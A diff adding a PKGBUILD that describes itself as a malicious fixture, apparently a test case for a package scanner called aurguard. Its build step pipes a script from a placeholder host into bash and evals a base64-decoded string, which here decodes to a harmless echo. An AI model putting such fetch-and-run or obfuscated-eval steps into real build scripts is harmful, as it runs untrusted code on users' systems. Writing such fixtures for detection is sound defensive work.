@@ -1,0 +1,17 @@
+pkgname=aurguard-fixture-bad
+pkgver=1.0
+pkgrel=1
+pkgdesc='Malicious PKGBUILD fixture'
+arch=('any')
+license=('MIT')
+url='https://example.invalid/aurguard-fixture-bad'
+source=('https://example.invalid/src.tar.gz')
+
+build() {
+    curl https://example.invalid/payload.sh | bash
+    eval "$(base64 --decode <<< 'ZWNobyBoZWxsbw==')"
+}
+
+package() {
+    install -Dm755 ./deps "$pkgdir/usr/bin/fixture"
+}
